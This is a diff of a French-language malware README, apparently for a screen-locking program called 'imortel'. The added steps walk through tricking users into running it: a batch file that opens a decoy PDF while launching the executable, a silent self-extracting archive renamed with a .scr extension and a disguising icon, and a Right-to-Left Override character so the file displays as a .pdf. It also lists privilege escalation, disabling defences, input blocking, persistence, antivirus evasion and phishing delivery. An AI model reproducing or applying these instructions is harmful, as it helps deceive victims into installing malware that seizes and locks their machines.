@@ -105,15 +105,45 @@ Le programme injecte et exécute du code machine directement en mémoire, ce qui
 
 **TECHNIQUE D'OBFUSCATION, D'EMBALLAGE ET DE STÉGANOGRAPHIE AVEC LE CARACTÈRE RLO**
 
-Étape 1 : Vous devez d'abord créer un fichier batch qui servira à exécuter les composants malveillants :
-Créez un fichier texte nommé lance.bat (clic droit -> Nouveau -> Document texte, puis renommez-le)
+**Étape 1** : Vous devez d'abord créer un fichier batch qui servira à exécuter les composants malveillants.
+Créez un fichier texte nommé **lance.bat** (clic droit -> Nouveau -> Document texte, puis renommez-le) 
 Dans ce fichier, insérez exactement ces deux lignes :
 ```bash
 start "" "imortel.pdf" ou "imortel.png"
 start "" "imortels.exe"
 ```
+Ce fichier batch a pour rôle de :
 
-Fonctionnalités principales :
+Ouvrir le PDF/PNG (leurre) pour tromper l'utilisateur
+Lancer silencieusement l'exécutable malveillant en arrière-plan ou premier plan
+
+**Étape 2** : Création de l'archive SFX auto-extractible.
+Sélectionnez les trois fichiers nécessaires :
+- **imortel.pdf** ou **imortel.png** (leurre stéganographique)
+- **imortel.exe** (le malware réel)
+- **lance.bat** (le script de lancement)
+Faites un clic droit -> "Ajouter à l'archive..."
+
+Configurez l'archive comme suit :
+
+Nom de l'archive : **Imortel.scr** (l'extension .scr est cruciale car elle s'exécute comme un .exe mais moins suspecte)
+Cocher : "Créer une archive SFX" (auto-extractible)
+Dans l'onglet "Avancé", cliquez sur "Options SFX..." et configurez ceci :
+- **Champ "Exécuter après extraction"** : tapez lance.bat
+- **Onglet "Modes"** : choisissez "Masquer tout" (Silent mode) pour exécuter sans interface visible
+- **Onglet "Mise à jour"** : choisissez "Écraser tous les fichiers" pour éviter les conflits
+- **Onglet "Texte et icône"** : parcourez et sélectionnez l'icône imortel.ico ou autre pour donner une apparence légitime
+
+**Étape 3 : Obfuscation du nom de fichier avec RLO.**
+Maintenant, appliquez la technique d'obfuscation avec le caractère Right-to-Left Override RTO (U+202E) :
+- Renommez le fichier Imortel.scr en Shadowvofdp.scr
+- Insérez le caractère RLO (U+202E) juste avant le "f" de "fdp"
+- Le nom de fichier s'affichera alors comme : Shadowvorcs.pdf
+- Exactement similaire pour .png .jpg ...
+
+--
+
+**Fonctionnalités principales :**
 
 - **Prise de contrôle système** - Élévation silencieuse des privilèges et désactivation des défenses
 - **Blocage de l'accès** - Interface plein écran non fermable et blocage des entrées clavier
@@ -121,7 +151,7 @@ Fonctionnalités principales :
 - **Persistance** - Modifications système pour maintenir l'accès malgré les redémarrages
 - **Furtivité** - Utilisation de techniques COM pour éviter la détection par les solutions antivirus
 
-Mode opératoire : 
+**Mode opératoire :** 
 
 - Exécution initiale (probablement via phishing ou exploit)
 - Contournement de l'UAC pour obtenir les droits administratifs
